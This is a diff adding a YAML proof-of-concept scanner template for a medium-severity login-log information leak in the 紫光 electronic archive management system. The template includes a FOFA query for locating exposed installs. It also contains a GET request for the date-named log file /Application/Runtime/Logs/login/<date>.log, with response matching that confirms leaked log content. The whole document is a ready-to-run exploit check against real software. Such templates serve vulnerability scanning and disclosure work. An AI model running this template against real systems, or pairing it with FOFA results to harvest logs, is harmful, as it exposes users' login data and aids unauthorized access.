@@ -1,0 +1,18 @@
+id: poc-yaml-thams-login-logs-info-leak
+info:
+  name: 紫光电子档案管理系统 login 日志信息泄露漏洞
+  severity: medium
+  tags:
+  - 信息泄露
+  finger: 紫光电子档案管理系统
+  fofa: app="紫光档案管理系统"
+variables:
+  path: datetime("06_01_02")
+  time: datetime("2006-01-02")
+requests:
+- method: GET
+  path: /Application/Runtime/Logs/login/{{.path}}.log
+  expression: "status_code == 200 &&\ncontains(body,\"KEY:\") && \ncontains(body,\"\
+    URL:\") && \ncontains(body,\"RunTime:0\") &&\n!contains(content_type,\"html\"\
+    ) &&\ncontains(body,time)\n"
+transport: http
